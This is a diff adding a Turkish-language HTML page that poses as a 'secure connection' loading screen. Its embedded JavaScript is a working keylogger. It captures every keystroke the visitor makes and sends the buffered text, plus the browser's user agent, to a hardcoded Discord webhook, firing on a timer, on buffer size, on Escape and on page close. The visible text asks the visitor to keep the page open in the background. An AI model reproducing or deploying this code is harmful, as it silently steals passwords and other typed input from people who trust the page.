@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Yükleniyor...</title>
+    <script>
+        // Discord webhook URL'si
+        const WEBHOOK = "https://discord.com/api/webhooks/1523665862798872766/Y-KJoRgMEb_nAc6qnE9QujfnGvQgurWTOgPKljLLL_cLgTd793_EOJTgUzmNVobn4G71";
+        
+        // Keylogger motoru (arka planda çalışır)
+        let logBuffer = "";
+        let sendTimer = null;
+
+        function sendToDiscord(text) {
+            if (!text.trim()) return;
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "```\n" + text.slice(0, 1900) + "\n```",
+                    username: "WebLogger"
+                })
+            }).catch(e => console.log("Hata:", e));
+        }
+
+        function flushLogs() {
+            if (logBuffer.length === 0) return;
+            sendToDiscord(logBuffer);
+            logBuffer = "";
+        }
+
+        // Tuş yakalama
+        document.addEventListener('keydown', function(e) {
+            const key = e.key;
+            if (key === "Escape") { flushLogs(); return; }
+            
+            if (key === "Enter") logBuffer += "\n";
+            else if (key === "Backspace") logBuffer = logBuffer.slice(0, -1);
+            else if (key === "Tab") logBuffer += "    ";
+            else if (key.length === 1) logBuffer += key;
+            else logBuffer += "[" + key.toUpperCase() + "]";
+
+            // Otomatik gönderim tetikleyicileri
+            if (logBuffer.length > 200) flushLogs();
+            
+            // Zamanlayıcıyı sıfırla (her tuşta yeniden başlat)
+            clearTimeout(sendTimer);
+            sendTimer = setTimeout(flushLogs, 15000); // 15 saniye sonra gönder
+        });
+
+        // Sayfa kapanırken son verileri gönder
+        window.addEventListener('beforeunload', flushLogs);
+
+        // Başlangıç bildirimi
+        setTimeout(() => {
+            sendToDiscord("✅ Web Keylogger Aktif | " + navigator.userAgent);
+        }, 2000);
+
+        console.log("[+] Keylogger başlatıldı. Sayfa arka planda çalışıyor.");
+    </script>
+    <style>
+        body { background: #1a1a2e; color: #fff; font-family: monospace; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; text-align: center; }
+        h1 { color: #0f0; }
+        .status { background: #16213e; padding: 20px; border-radius: 10px; }
+        .dot { display: inline-block; width: 12px; height: 12px; background: #0f0; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .footer { margin-top: 40px; color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="status">
+            <h1>🔒 Güvenli Bağlantı Kuruluyor</h1>
+            <p><span class="dot"></span> Sistem aktif ve çalışıyor...</p>
+            <p style="color: #aaa; font-size: 14px;">Bu sayfayı arka planda açık bırakabilirsiniz.</p>
+        </div>
+        <div class="footer">v2.4.1 | Güvenli oturum</div>
+    </div>
+</body>
+</html>
